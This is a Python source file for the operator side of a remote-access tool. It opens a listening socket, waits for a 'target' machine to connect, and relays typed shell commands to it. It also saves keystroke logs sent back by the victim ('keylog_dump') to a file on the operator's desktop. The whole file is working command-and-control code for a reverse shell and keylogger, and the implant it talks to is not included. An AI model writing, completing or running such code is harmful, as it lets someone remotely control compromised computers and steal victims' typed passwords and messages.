import socket, json, os, sys, subprocess, threading, time


hostIP = "127.0.0.1" #socket bound IP
port = 6969 #socket bound port. One that no one listens too
fileName = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') + '\dump.txt'     # for running on Windows
#fileName = 'dump.txt'                             # for running on Linux and Mac

#Socket creation and connection establishment
# If the socket is not created successfully, the program exits with code 1
try:
    scock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket object
    print("***INITIALIZING 1/3: Socket creation passed***")
    scock.bind((hostIP, port))
    print("***INITIALIZING 2/3: Socket binding passed***")
    scock.listen(10)
    print("***INITIALIZING 3/3: Socket now listening***")
except:
    print("***INITIALIZATION FAILED: Socket creation failed***\nEXITING...")
    scock.close()
    exit(1)
    
print("\nWaiting for connection...")
connection, address = scock.accept()
print("\nConnection established with adrress: ", address)
##############################################################


##############################################################
#Sending and recieving functionality
"""
The target_communication function is intended to keep connections alive to send and recieve commands.
To do this, a while loop is executed and input is taken for the desired command to be sent.
That command is then sent with the send_command function.
If the command is keylog_dump, a file is also opened up to write the dump to dump.txt
If quit is ever entered, the loop is broken and program exits. 
"""
#controller for send_command() and recv_command(). Call this one.
def target_communication():
    count = 0
    while True:
        command = input('*Shell~%s: ' % str(hostIP))
        send_command(command)
        if command == 'keylog_dump':
            with open(fileName, 'w+') as file:
                file.write(recv_command())
                print('[*] Keylog dump created..')
        else:
            print(recv_command())
            if command == 'quit':
                break

#sends the data
"""
The send command function is very straightforward. Data is encoded to json and sent with the 
connection.send socket function.  
"""
def send_command(data):
    jsondata = json.dumps(data)
    connection.send(jsondata.encode())

# recieves the data
"""
The recv command function is the inverse of send. It takes a buffer from connection.recv,
decodes it, and strips it, then returns that data. If a value error is discovered, an exception is thrown.
"""
def recv_command():
    data = ''
    while True:
        try:
            data = data + connection.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
##############################################################


#test driver 2
# This just exists to make the UI cleaner and to start the program itself.
print("\n***SERVER READY***\n")
try:
    target_communication()
    print("\n***CLOSING SERVER***\n")
    scock.close()
except Exception as e:
    print (e.args)
##############################################################